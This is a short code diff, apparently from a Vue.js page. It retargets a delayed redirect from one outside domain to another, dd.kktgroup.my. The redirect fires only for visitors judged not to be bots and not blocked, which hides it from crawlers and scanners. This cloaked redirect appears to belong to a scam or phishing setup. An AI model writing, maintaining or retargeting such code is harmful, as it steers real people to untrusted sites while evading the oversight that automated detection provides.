@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://pt.goldherramientas.com.ar/';
+          window.location.href = 'https://dd.kktgroup.my/';
         }, 3000);
       }
     });
